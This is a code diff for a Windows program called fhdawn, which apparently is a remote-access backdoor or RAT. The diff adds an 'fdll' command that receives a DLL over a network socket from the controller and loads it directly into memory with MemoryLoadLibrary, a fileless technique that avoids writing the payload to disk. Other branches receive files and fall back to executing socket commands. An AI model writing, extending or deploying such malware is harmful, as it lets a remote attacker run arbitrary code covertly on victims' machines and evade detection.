@@ -6,6 +6,11 @@ Modified: -
 */
 
 #include "fhdawn.h"
+#include "MemoryModule.h"
+
+int fsize = 0;
+char* fileinfo[2];
+HMEMORYMODULE handle = NULL;
 
 // By @augustgl (github.com/augustgl)
 void sockprintf(SOCKET sock, const char* words, ...) {
@@ -109,9 +114,37 @@ void fhdawn_main(void)
                 }
                 CloseHandle(recvfile);
             }
+        }
+        else if (strcmp(recvbuf, "fdll") == 0)
+        {
             
+            memset(recvbuf, '\0', BUFFER);
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                break;
+            }
+            split(recvbuf, fileinfo, ":");
+            int expected = atoi(fileinfo[1]);
+            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
+            memset(recvbuf, '\0', BUFFER);
+            int total = 0;
+            do {
+                fsize = recv(sockfd, recvbuf, BUFFER, 0);
+                memcpy(DLL + total, recvbuf, fsize);
+                total += fsize;
+            } while (total != expected);
 
-        } 
+            handle = MemoryLoadLibrary(DLL, expected);
+            if (handle == NULL)
+            {
+                sockprintf(sockfd,"Can't load library from memory.\n");
+            }
+            else {
+                sockprintf(sockfd, "DLL Loaded in memory.\n");
+            }
+
+        }
         else {
             ExecSock();
         }
